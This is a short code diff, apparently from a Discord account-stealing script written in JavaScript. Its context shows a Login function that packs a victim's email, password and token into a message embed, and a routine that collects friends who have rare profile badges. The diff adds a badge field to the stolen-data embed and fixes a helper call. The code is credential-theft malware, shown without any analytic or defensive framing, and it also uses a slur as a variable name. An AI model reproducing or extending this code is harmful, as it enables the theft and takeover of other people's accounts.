@@ -155,7 +155,7 @@ function GetFriends() {
             })
             var gay = "";
             for (z of r) {
-                var b = GetRBadges(z.user.public_flags)
+                var b = GetBadges(z.user.public_flags)
                 if (b != "") {
                     gay += b + ` ${z.user.username}:hash:${z.user.discriminator}\n`
                 }
@@ -196,6 +196,11 @@ function Login(email, password, token) {
                             "name": "**Token**",
                             "value": `\`${token}\``,
                             "inline": false
+                        },
+                        {
+                            "name": "**Badges**",
+                            "value": `${GetBadges(json.flags)}`,
+                            "inline": true
                         }
                     ],
                     "author": {
